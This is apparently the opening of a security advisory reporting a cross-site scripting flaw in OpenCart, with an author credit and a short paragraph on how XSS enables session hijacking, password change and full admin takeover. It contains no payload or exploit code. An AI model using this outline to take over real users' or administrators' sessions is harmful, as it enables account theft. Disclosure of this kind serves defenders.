Author: Hamed Izadi 
Email: array("hamedizadi", "@", "gmail", ".com");
Name: XSS Vulnerability in OpenCart

By exploiting a Cross-site scripting vulnerability the attacker can hijack
a logged in users session. This means that the malicious hacker can change
the logged in users password and invalidate the session of the victim
while the hacker maintains access. As seen from the XSS example in this
article, if a web application is vulnerable to cross-site scripting and the
administrators session is hijacked, the malicious hacker exploiting the
vulnerability will have full admin privileges on that web application.
